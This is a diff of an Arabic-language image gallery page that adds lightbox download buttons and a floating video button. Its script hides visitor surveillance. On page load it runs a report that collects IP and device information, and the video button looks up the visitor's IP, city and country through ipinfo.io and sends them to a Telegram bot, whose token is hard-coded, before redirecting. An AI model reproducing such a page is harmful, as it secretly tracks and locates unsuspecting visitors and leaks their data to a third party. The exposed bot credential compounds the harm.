@@ -13,6 +13,7 @@
       direction: rtl;
       text-align: center;
       overflow-x: hidden;
+      position: relative;
     }
 
     .top-description {
@@ -88,12 +89,14 @@
       align-items: center;
       justify-content: center;
       z-index: 999;
+      flex-direction: column;
     }
 
     .lightbox img {
       max-width: 90%;
-      max-height: 90%;
+      max-height: 80%;
       border-radius: 10px;
+      margin-bottom: 20px;
     }
 
     .lightbox:target {
@@ -109,18 +112,33 @@
       text-decoration: none;
     }
 
-    /* زر الفيديو */
-    .video-button {
-      margin: 30px auto;
-      display: inline-block;
-      padding: 15px 30px;
+    .download-btn {
+      background-color: purple;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    /* 👑 زر فيديو دائري */
+    .video-fab {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
       background-color: black;
       color: pink;
-      border: none;
-      border-radius: 15px;
-      font-size: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 15px pink;
       animation: pulse 2s infinite;
       cursor: pointer;
+      z-index: 1000;
     }
   </style>
 </head>
@@ -143,20 +161,23 @@
     <a href="#img1"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
     <a href="#img2"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
     <a href="#img3"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
-    <a href="#img4"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
-    <a href="#img5"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
-    <a href="#img6"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
-    <a href="#img7"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
-    <a href="#img8"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
-    <a href="#img9"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
   </div>
 
-  <!-- 👑 نوافذ تكبير الصور -->
-  <div id="img1" class="lightbox"><a href="#" class="close-btn">×</a><img src="بدون اسم130_20250502141304.png"></div>
-  <div id="img2" class="lightbox"><a href="#" class="close-btn">×</a><img src="بدون اسم150_20250616203704.png"></div>
+  <!-- 👑 نوافذ تكبير الصور مع زر تحميل -->
+  <div id="img1" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="بدون اسم130_20250502141304.png" id="zoom1">
+    <a href="بدون اسم130_20250502141304.png" download class="download-btn">تحميل الصورة</a>
+  </div>
 
-  <!-- 👑 زر فيديو برابط قابل للتغيير -->
-  <button class="video-button" onclick="sendVideoClick()">🎥 مشاهدة الفيديوهات</button>
+  <div id="img2" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="بدون اسم150_20250616203704.png" id="zoom2">
+    <a href="بدون اسم150_20250616203704.png" download class="download-btn">تحميل الصورة</a>
+  </div>
+
+  <!-- 👑 زر فيديو دائري يفتح index.html -->
+  <div class="video-fab" onclick="goToIndex()">🎥</div>
 
   <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
@@ -206,7 +227,6 @@
       });
     }
 
-    // 📤 تقرير الدخول الأول
     async function runReport() {
       await getIPInfo();
       getDeviceInfo();
@@ -215,16 +235,17 @@
 
     runReport();
 
-    // 📤 عند الضغط على زر الفيديو
-    function sendVideoClick() {
-      fetch("")
+    // 👑 فتح صفحة index عند الضغط على زر الفيديو
+    function goToIndex() {
+      fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(data => {
-          const msg = `🎬 دخول زر الفيديو:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}\n🔗 👑 /videos.html`;
+          const msg = `🎬 دخول إلى index-videos.html:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`;
           sendToTelegram(msg);
-          window.location.href = "index-videos.html"; // 👑 ضع هنا رابط الفيديو
+          window.location.href = "index-videos.html"; // 👑 يمكن تغييره
         });
     }
   </script>
 </body>
 </html>
+
